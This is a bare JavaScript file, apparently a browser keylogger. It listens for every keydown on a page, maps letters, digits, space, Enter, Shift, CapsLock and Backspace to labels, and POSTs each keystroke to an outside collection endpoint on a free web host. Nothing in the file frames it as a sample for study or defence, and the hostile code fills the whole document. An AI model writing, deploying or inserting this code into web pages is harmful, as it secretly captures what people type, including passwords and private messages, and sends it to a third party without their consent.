window.addEventListener("keydown", checkKeyPress, false);
function checkKeyPress(key) {
 if (key.keyCode == "65") {
 senddata("a")
 }
 if (key.keyCode == "66") {
 senddata("b")
 }
 if (key.keyCode == "67") {
 senddata("c")
 }
 if (key.keyCode == "68") {
 senddata("d")
 }
 if (key.keyCode == "69") {
 senddata("e")
 }
 if (key.keyCode == "70") {
 senddata("f")
 }
 if (key.keyCode == "71") {
 senddata("g")
 }
 if (key.keyCode == "72") {
 senddata("h")
 }
 if (key.keyCode == "73") {
 senddata("i")
 }
 if (key.keyCode == "74") {
 senddata("j")
 }
 if (key.keyCode == "75") {
 senddata("k")
 }
 if (key.keyCode == "76") {
 senddata("l")
 }
 if (key.keyCode == "77") {
 senddata("m")
 }
 if (key.keyCode == "78") {
 senddata("n")
 }
 if (key.keyCode == "79") {
 senddata("o")
 }
 if (key.keyCode == "80") {
 senddata("p")
 }
 if (key.keyCode == "81") {
 senddata("q")
 }
 if (key.keyCode == "82") {
 senddata("r")
 }
 if (key.keyCode == "83") {
 senddata("s")
 }
 if (key.keyCode == "84") {
 senddata("t")
 }
 if (key.keyCode == "85") {
 senddata("u")
 }
 if (key.keyCode == "86") {
 senddata("v")
 }
 if (key.keyCode == "87") {
 senddata("w")
 }
 if (key.keyCode == "88") {
 senddata("x")
 }
 if (key.keyCode == "89") {
 senddata("y")
 }
 if (key.keyCode == "90") {
 senddata("z")
 }
 if (key.keyCode == "32") {
 senddata("_")
 }
 if (key.keyCode == "16") {
 senddata("Shift")
 }
 if (key.keyCode == "13") {
 senddata("Enter")
 }
 if (key.keyCode == "20") {
 senddata("CapsLock")
 }
 if (key.keyCode == "8") {
 senddata("Backspace")
 }
 if (key.keyCode == "48") {
 senddata("0")
 }
 if (key.keyCode == "49") {
 senddata("1")
 }
 if (key.keyCode == "50") {
 senddata("2")
 }
 if (key.keyCode == "51") {
 senddata("3")
 }
 if (key.keyCode == "52") {
 senddata("4")
 }
 if (key.keyCode == "53") {
 senddata("5")
 }
 if (key.keyCode == "54") {
 senddata("6")
 }
 if (key.keyCode == "55") {
 senddata("7")
 }
 if (key.keyCode == "56") {
 senddata("8")
 }
 if (key.keyCode == "57") {
 senddata("9")
 }
}

function senddata(keystork){
  var url = "https://example.000webhostapp.com/1.php";
  var params = keystork;
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send(params);
}
